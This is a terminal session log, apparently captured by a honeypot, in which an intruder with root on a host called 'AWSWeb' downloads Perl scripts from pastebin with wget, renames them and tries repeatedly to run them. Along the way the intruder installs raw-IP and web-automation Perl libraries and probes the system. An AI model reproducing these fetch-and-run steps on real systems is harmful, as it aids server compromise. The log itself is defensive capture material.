@@ -1,0 +1,239 @@
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# s[1D[1Pls
+[4l[4hAWSWeb:~# yum
+bash: yum: command not found
+AWSWeb:~# 
+AWSWeb:~# yum -y install perl
+bash: yum: command not found
+AWSWeb:~# wget http://pastebin.com/raw.php?i=Vb79f5PZ -O banner313.pl
+[4l--2013-06-23 23:21:06--  http://pastebin.com/raw.php?i=Vb79f5PZ
+Connecting to pastebin.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain; charset=utf-8]
+Saving to: `raw.php
+
+ 1K [>                                      ] 1,092        8K/s  eta 0s100%[======================================>] 0            8K/s
+
+2013-06-23 23:21:06 (8 KB/s) - `raw.php' saved [27588/0]
+[4hAWSWeb:~# ls
+[4lraw.php 
+[4hAWSWeb:~# mvmvas[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pv raw.php banner313.pl
+[4l[4hAWSWeb:~# ls
+[4lbanner313.pl 
+[4hAWSWeb:~# perl bn[1D[1P[1D[1Pbanner313.pl
+bash: perl: command not found
+AWSWeb:~# yum -y install perl
+bash: yum: command not found
+AWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# apt-get install libwww-perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  libwwwperl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 563.2kB of archives.
+After this operation, 1238.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main libwwwperl 0.37-2 [563.2kB]
+Fetched 563.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking libwwwperl (from .../archives/libwwwperl_0.37-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up libwwwperl (0.37-2) ...
+[4hAWSWeb:~# apt-get install libwww-mechanize-perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  libwwwmechanizeperl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 224.2kB of archives.
+After this operation, 492.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main libwwwmechanizeperl 1.37-7 [224.2kB]
+Fetched 224.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking libwwwmechanizeperl (from .../archives/libwwwmechanizeperl_1.37-7_i386.deb) ...
+Processing triggers for man-db ...
+Setting up libwwwmechanizeperl (1.37-7) ...
+[4hAWSWeb:~# apt-get install libwww-mechanize-formfiller-perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  libwwwmechanizeformfillerperl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 483.2kB of archives.
+After this operation, 1062.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main libwwwmechanizeformfillerperl 0.4-7 [483.2kB]
+Fetched 483.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking libwwwmechanizeformfillerperl (from .../archives/libwwwmechanizeformfillerperl_0.4-7_i386.deb) ...
+apt-get install libnet-rawip-perlProcessing triggers for man-db ...
+Setting up libwwwmechanizeformfillerperl (0.4-7) ...
+[4hAWSWeb:~# apt-get install libnet-rawip-perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  install libnetrawipperlaptget libnetrawipperl 
+0 upgraded, 3 newly installed, 0 to remove and 259 not upgraded.
+Need to get 1727.2kB of archives.
+After this operation, 3799.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main install 1.14-4 [851.2kB]
+Get:2 http://ftp.debian.org stable/main libnetrawipperlaptget 0.30-9 [265.2kB]
+Get:3 http://ftp.debian.org stable/main libnetrawipperl 1.5-10 [611.2kB]
+Fetched 1727.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking install (from .../archives/install_1.14-4_i386.deb) ...
+Unpacking libnetrawipperlaptget (from .../archives/libnetrawipperlaptget_0.30-9_i386.deb) ...
+Unpacking libnetrawipperl (from .../archives/libnetrawipperl_1.5-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up install (1.14-4) ...
+Setting up libnetrawipperlaptget (0.30-9) ...
+Setting up libnetrawipperl (1.5-10) ...
+[4hAWSWeb:~# apt-get install libnet-dns-resolver-programmable-perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  libnetdnsresolverprogrammableperl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 871.2kB of archives.
+After this operation, 1916.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main libnetdnsresolverprogrammableperl 0.25-5 [871.2kB]
+Fetched 871.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking libnetdnsresolverprogrammableperl (from .../archives/libnetdnsresolverprogrammableperl_0.25-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up libnetdnsresolverprogrammableperl (0.25-5) ...
+[4hAWSWeb:~# perl abne[1D[1P[1D[1P[1D[1P[1D[1Pbanner313..pl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P313.pl
+bash: perl: command not found
+AWSWeb:~# apt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 854.2kB of archives.
+After this operation, 1878.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 0.27-9 [854.2kB]
+Fetched 854.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_0.27-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (0.27-9) ...
+[4hAWSWeb:~# [Kapt-get install perl[20D[Kperl banner313.pl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# apt-get install perl upgrade
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  upgrade perl 
+0 upgraded, 2 newly installed, 0 to remove and 259 not upgraded.
+Need to get 755.2kB of archives.
+After this operation, 1661.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main upgrade 0.13-7 [173.2kB]
+Get:2 http://ftp.debian.org stable/main perl 1.35-5 [582.2kB]
+Fetched 755.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking upgrade (from .../archives/upgrade_0.13-7_i386.deb) ...
+Unpacking perl (from .../archives/perl_1.35-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up upgrade (0.13-7) ...
+Setting up perl (1.35-5) ...
+[4hAWSWeb:~# [Kapt-get install perl upgrade[28D[Kperl banner313.pl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# P banner313.pl
+bash: P: command not found
+AWSWeb:~# wget http://pastebin.com/raw.php?i=HRWt31Qe -O g3m.pl
+[4l--2013-06-23 23:31:06--  http://pastebin.com/raw.php?i=HRWt31Qe
+Connecting to pastebin.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain; charset=utf-8]
+Saving to: `raw.php
+
+ 1K [>                                      ] 1,080        6K/s  eta 0s100%[======================================>] 0            6K/s
+
+2013-06-23 23:31:06 (6 KB/s) - `raw.php' saved [9691/0]
+[4hAWSWeb:~# lss[1D[1P
+[4lbanner313.pl raw.php      
+[4hAWSWeb:~# mv raw.php g3m.pl
+[4l[4hAWSWeb:~# perl g3m.pl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# users
+bash: users: command not found
+AWSWeb:~# asdls
+bash: asdls: command not found
+AWSWeb:~# ls
+[4lbanner313.pl g3m.pl       
+[4hAWSWeb:~# users
+bash: users: command not found
+AWSWeb:~# uptime
+[4l 23:57:12 up 150 days, 2:1,  1 users, load averages: 0.09 0.05 0.05
+[4hAWSWeb:~# uptime
+[4l 23:57:25 up 150 days, 2:1,  1 users, load averages: 0.09 0.05 0.05
+[4hAWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# -[1D[1Puname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# 
+AWSWeb:~# uanem[1D[1P[1D[1P[1D[1P[1D[1Pname =-[1D[1P[1D[1P-=a[1D[1P[1D[1Pa
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# gcc
+bash: gcc: command not found
+AWSWeb:~# make
+bash: make: command not found
+AWSWeb:~# gmake
+bash: gmake: command not found
+AWSWeb:~# perl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# apt-get install
+[4l0 upgraded, 0 newly installed, 0 to remove and 293 not upgraded.
+[4hAWSWeb:~# g[1D[1Puptime
+[4l 00:46:16 up 150 days, 2:50,  1 users, load averages: 0.09 0.05 0.05
+[4hAWSWeb:~# 
